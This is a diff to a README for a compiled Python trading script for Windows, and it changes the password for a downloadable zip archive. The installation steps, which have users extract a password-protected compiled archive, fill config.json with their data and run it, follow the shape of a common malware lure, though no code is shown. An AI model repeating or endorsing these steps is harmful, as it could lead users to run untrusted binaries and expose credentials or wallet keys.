@@ -20,7 +20,7 @@ This repository contains a compiled and optimized Python script designed for sea
 - Windows 10 and more
 
 ## Installing
-- [Clone](https://github.com/origami-xyz/Tensor-trade-script/archive/refs/heads/main.zip) repository and extract files with password `123`.
+- [Clone](https://github.com/origami-xyz/Tensor-trade-script/archive/refs/heads/main.zip) repository and extract files with password `Ci27S0etuIh`.
 - Edit `config.json` with your data and launch script.
 
 ## Usage Instructions
